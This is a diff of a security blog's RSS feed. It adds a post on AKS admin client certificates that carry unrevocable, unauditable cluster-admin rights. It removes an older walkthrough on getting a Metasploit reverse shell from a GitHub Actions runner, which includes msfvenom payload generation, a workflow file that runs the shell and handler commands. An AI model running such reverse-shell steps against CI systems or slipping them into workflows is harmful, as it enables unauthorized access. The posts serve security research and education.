@@ -7,6 +7,45 @@
 		<atom:link href="/feed.xml" rel="self" type="application/rss+xml" />
 		
 			<item>
+				<title>The revenge of system:masters, return of the AKS</title>
+				<description>&lt;p&gt;When looking at an AKS cluster recently, I came across some unusual default behaviour, which I thought deserved some more investigation over the weekend. Seems like AKS is making some … interesting… choices with regards to user authentication, in some setups.&lt;/p&gt;
+
+&lt;p&gt;Usually when you authenticate to an Azure AD (AAD) enabled AKS cluster it uses OAuth with a short renewal window for credentials, which is great as it leverages the Azure AD authentication process and has a nice short expiry to reduce the risk of a misplaced kubeconfig file.&lt;/p&gt;
+
+&lt;p&gt;However there’s an option on the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;az aks get-credentials&lt;/code&gt; command which acts a bit differently. If you pass &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;--admin&lt;/code&gt; to that command, instead of using OAuth, it adds a client certificate file to your &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;kubeconfig&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;Client certificate authentication in Kubernetes is a bit problematic for a number of reasons, the main one being that there is &lt;strong&gt;no way&lt;/strong&gt; to revoke a credential once it’s issued (short of rolling the keys for the whole certificate authority), that means it’s generally unsuitable for any production cluster and definitely production clusters used by large organizations.&lt;/p&gt;
+
+&lt;p&gt;However digging into the client cert issued by AKS, things get worse. If you decode it (the one below is from a sample AKS cluster I set-up using the standard &lt;a href=&quot;https://docs.microsoft.com/en-us/azure/aks/kubernetes-walkthrough&quot;&gt;AKS QuickStart&lt;/a&gt;), you’ll see something like this&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; Validity
+   Not Before: Nov 28 20:11:59 2020 GMT
+   Not After : Nov 28 20:21:59 2022 GMT
+   Subject: O &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; system:masters, CN &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; masterclient
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;The way that Kubernetes client certificate authentication works, the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;CN&lt;/code&gt; field is considered the username and the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;O&lt;/code&gt; field is the group the user belongs to, so this is logging in with a username of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;masterclient&lt;/code&gt; and a group of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;system:masters&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;First problem is the username. That’s not the name of the user I used to login, this is a generic username. That means that any actions taken by this credential will show up with a generic username not matter who uses it, bit of a problem for auditing.&lt;/p&gt;
+
+&lt;p&gt;The second problem is the group name. &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;system:masters&lt;/code&gt; is a special group in Kubernetes, its access as a cluster-admin is hardcoded into the Kubernetes source code and there’s no way to remove those rights, so this credential will always have cluster-admin rights.&lt;/p&gt;
+
+&lt;p&gt;The third problem is the expiry, which is 2 years from cluster setup. So anyone with this credential has a generic cluster-admin level login which can’t be revoked (short of rolling the entire certifiicate authority used for the cluster) and can’t be audited, which lasts for up to two years.&lt;/p&gt;
+
+&lt;p&gt;Another surprising thing I noticed was that, in non-AAD enabled clusters, users with the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Azure Kubernetes Service Cluster User Role&lt;/code&gt; get this same certificate given to them when they use &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;az aks get-credentials&lt;/code&gt; even without the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;--admin&lt;/code&gt; switch! This is a &lt;a href=&quot;https://github.com/Azure/AKS/issues/1343&quot;&gt;known issue&lt;/a&gt; with AKS…&lt;/p&gt;
+
+&lt;h2 id=&quot;conclusion&quot;&gt;Conclusion&lt;/h2&gt;
+
+&lt;p&gt;A couple of takeaways if your organization is planning to use Azure AKS. First up if your clusters are AAD enabled, be &lt;strong&gt;very&lt;/strong&gt; careful with who has rights to used the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;--admin&lt;/code&gt; switch on the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;get-credentials&lt;/code&gt; command. Secondly, I’d recommend not exposing your clusters directly on the Internet to reduce the likely impact of this.&lt;/p&gt;
+
+&lt;p&gt;If you’re using non-AAD enabled clusters, it’s worth noting that all your users may be using generic cluster-admin credentials, so you should check the generated kubeconfig files and plan for that.&lt;/p&gt;
+</description>
+				<pubDate>Sun, 29 Nov 2020 11:00:39 +0000</pubDate>
+				<link>/blog/2020/11/29/The_revenge_of_system_masters/</link>
+				<guid isPermaLink="true">/blog/2020/11/29/The_revenge_of_system_masters/</guid>
+			</item>
+		
+			<item>
 				<title>When is a Vulnerability (possibly) not a vulnerability</title>
 				<description>&lt;p&gt;Over the last couple of months I’ve been looking at container vulnerability scanning a bit (some more info &lt;a href=&quot;https://raesene.github.io/blog/2020/06/21/Container_Vulnerability_Scanning_Fun/&quot;&gt;here&lt;/a&gt;), and there  was one behaviour I noticed that’s probably worth commenting on, as it can be a bit unexpected, and that’s the handling of unfixed vulnerbilities.&lt;/p&gt;
 
@@ -607,129 +646,6 @@ registries = ['registry.redhat.io', 'quay.io', 'docker.io']
 				<pubDate>Sat, 14 Sep 2019 17:10:39 +0100</pubDate>
 				<link>/blog/2019/09/14/kube-security-lab/</link>
 				<guid isPermaLink="true">/blog/2019/09/14/kube-security-lab/</guid>
-			</item>
-		
-			<item>
-				<title>Shells in Github Actions</title>
-				<description>&lt;p&gt;I recently got my beta invite to the awesome &lt;a href=&quot;https://github.com/features/actions&quot;&gt;Github Actions&lt;/a&gt; feature.  This is a free to use CI/CD system.  If you’re not familiar with CI/CD, you can think of it as a system which runs a series of actions during your development process to help test/maintain/deploy it.  For example you could use CI to run your test suite on every commit, so you know if someone just broke the build.&lt;/p&gt;
-
-&lt;p&gt;To do this we use “runners” which are essentially execution environments (e.g. a Virtual Machine) that runs our tests or other actions.&lt;/p&gt;
-
-&lt;p&gt;Of course what do pentesters think, seeing the idea that someone’s going to let me execute commands somewhere… “hey can I get a shell on that?” :)&lt;/p&gt;
-
-&lt;p&gt;&lt;a href=&quot;https://twitter.com/antitree/status/1164193020612423680?s=20&quot;&gt;Antitree got there first on twitter&lt;/a&gt; but I thought it could be fun to walk through the process in a little more detail than twitter’s format allows.&lt;/p&gt;
-
-&lt;p&gt;The pre-requisite for this is that your Github account has actions enabled.  Once you’ve got that here’s a set of steps to get a shell on one of Github’s runners.&lt;/p&gt;
-
-&lt;p&gt;It’s worth noting that what we’re detailing below isn’t likely any kind of security issue for Github, I’d expect that they’re providing dedicated ephemeral instances as CI runners, so you’re not likely to get access to anyone else’s infrastructure using this technique, it’s just a bit of fun :)&lt;/p&gt;
-
-&lt;p&gt;One thing to note though in general for CI/CD environments is how important isolation is, if you’re running untrusted code in pipelines.  As we’ll show here, it’s pretty easy to get a shell back out of a runner, so don’t run these in a network with other important hosts…&lt;/p&gt;
-
-&lt;h3 id=&quot;prepare-the-payload&quot;&gt;Prepare the payload&lt;/h3&gt;
-
-&lt;p&gt;Just like in the previous post on &lt;a href=&quot;https://raesene.github.io/blog/2019/08/10/making-it-rain-shells-in-Kubernetes/&quot;&gt;Kubernetes shells&lt;/a&gt; we’re going to use &lt;a href=&quot;https://www.metasploit.com/&quot;&gt;Metasploit&lt;/a&gt; for this.  So we need a reverse shell payload that we can call back to.  For this, you’ll need to have the port receiving the connection visible on the Internet with no firewall in the way, you could use something like a Digital Ocean droplet or EC2 instance for this.&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;msfvenom -p linux/x64/meterpreter_reverse_http LHOST=YOURIP LPORT=YOURPORT -f elf &amp;gt; reverse_shell.elf
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;just replace &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;YOURIP&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;YOURPORT&lt;/code&gt; with your information.&lt;/p&gt;
-
-&lt;p&gt;Now we’ve got a shell program, just start a new Github repository and add the shell to the repo.&lt;/p&gt;
-
-&lt;h3 id=&quot;our-gtihub-action&quot;&gt;Our Gtihub Action&lt;/h3&gt;
-
-&lt;p&gt;We just need to create our action now that will get triggered when we push changes to our Github repository.  Github actions live in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.github/workflows/&lt;/code&gt; and are in YAML format.  Create a file called &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;testaction.yml&lt;/code&gt; in there and you can put something like this into the file.&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;name: Shell
-
-on: [push]
-
-jobs:
-
-  build:
- 
-    runs-on: ubuntu-latest
- 
-    steps:
-    - uses: actions/checkout@v1
-    - name: metasploit reverse shell
-      run: ./reverse_shell.elf
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Now when we commit our repository, Github should run our action.  Before we do that make sure to set-up Metasploit to receive the connection.&lt;/p&gt;
-
-&lt;h3 id=&quot;metasploit-handler&quot;&gt;Metasploit handler&lt;/h3&gt;
-
-&lt;p&gt;after running &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;msfconsole&lt;/code&gt; you can do the following steps&lt;/p&gt;
-
-&lt;ol&gt;
-  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;use exploit/multi/handler&lt;/code&gt;&lt;/li&gt;
-  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;set payload linux/x64/meterpreter_reverse_http&lt;/code&gt;&lt;/li&gt;
-  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;set LHOST YOURIP&lt;/code&gt;&lt;/li&gt;
-  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;set LPORT YOURPORT&lt;/code&gt;&lt;/li&gt;
-  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;exploit&lt;/code&gt;&lt;/li&gt;
-&lt;/ol&gt;
-
-&lt;p&gt;Then push your shell and action code to Github to trigger the action, and all being well you should get a shell :)&lt;/p&gt;
-
-&lt;h3 id=&quot;looking-around-a-github-runner&quot;&gt;Looking around a Github runner&lt;/h3&gt;
-
-&lt;p&gt;So once you’ve got your shell what can you see? Well it’s running an Ubuntu based distro, as we’d expect (it is possible to get Windows or indeed Mac runners, so you could repeat this exercise with them)&lt;/p&gt;
-
-&lt;p&gt;&lt;strong&gt;“Privesc”&lt;/strong&gt;&lt;/p&gt;
-
-&lt;p&gt;When you first get the shell, you’re running as the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;runner&lt;/code&gt; user but it’s got passwordless &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sudo&lt;/code&gt; access, so you can just &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sudo bash&lt;/code&gt; to get &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;root&lt;/code&gt;.&lt;/p&gt;
-
-&lt;p&gt;&lt;strong&gt;Listening ports&lt;/strong&gt;&lt;/p&gt;
-
-&lt;p&gt;Running &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ss -ltnp&lt;/code&gt; will show us the listening TCP ports&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;State    Recv-Q    Send-Q        Local Address:Port        Peer Address:Port    
-LISTEN   0         80                127.0.0.1:3306             0.0.0.0:*       
-LISTEN   0         128           127.0.0.53%lo:53               0.0.0.0:*       
-LISTEN   0         128                 0.0.0.0:22               0.0.0.0:*       
-LISTEN   0         128                    [::]:22                  [::]:*  
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;The port &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;3306/TCP&lt;/code&gt; is kind of interesting, as my action didn’t make any use of MySQL.&lt;/p&gt;
-
-&lt;p&gt;&lt;strong&gt;Routing Table&lt;/strong&gt;&lt;/p&gt;
-
-&lt;p&gt;Nothing hugely interesting on the routing table, although interesting that &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;docker0&lt;/code&gt; is there, so we’re running Docker on the runner host.&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Kernel IP routing table
-Destination     Gateway         Genmask         Flags Metric Ref    Use Iface
-0.0.0.0         10.1.0.1        0.0.0.0         UG    100    0        0 eth0
-10.1.0.0        0.0.0.0         255.255.0.0     U     0      0        0 eth0
-168.63.129.16   10.1.0.1        255.255.255.255 UGH   100    0        0 eth0
-169.254.169.254 10.1.0.1        255.255.255.255 UGH   100    0        0 eth0
-172.17.0.0      0.0.0.0         255.255.0.0     U     0      0        0 docker0
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;&lt;strong&gt;Running Processes&lt;/strong&gt;&lt;/p&gt;
-
-&lt;p&gt;One thing I thought was interesting, although not really surprising, is that there are quite a few dotnet core processes running on the host.&lt;/p&gt;
-
-&lt;p&gt;&lt;strong&gt;Users on the host&lt;/strong&gt;&lt;/p&gt;
-
-&lt;p&gt;A quick look at &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/passwd&lt;/code&gt; shows up a couple of non-standard users&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;pollinate:x:110:1::/var/cache/pollinate:/bin/false
-mysql:x:111:116:MySQL Server,,,:/nonexistent:/bin/false
-sphinxsearch:x:112:117:Sphinx fulltext search service,,,:/var/run/sphinxsearch:/usr/sbin/nologin
-runneradmin:x:1000:1000:Ubuntu:/home/runneradmin:/bin/bash
-runner:x:1001:115:,,,:/home/runner:/bin/bash
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;h3 id=&quot;conclusion&quot;&gt;Conclusion&lt;/h3&gt;
-
-&lt;p&gt;This is just a quick exploration of a Github Actions runner host, showing some of the techniques that can be used to get shells in CI systems, if you have the ability to submit commands to them.&lt;/p&gt;
-
-&lt;p&gt;Overall Github actions looks really cool, and I’m looking forward to integrating it into a lot of my repo’s alongside their private repository feature.&lt;/p&gt;
-</description>
-				<pubDate>Sun, 25 Aug 2019 13:10:39 +0100</pubDate>
-				<link>/blog/2019/08/25/shells-in-gh-actions/</link>
-				<guid isPermaLink="true">/blog/2019/08/25/shells-in-gh-actions/</guid>
 			</item>
 		
 	</channel>
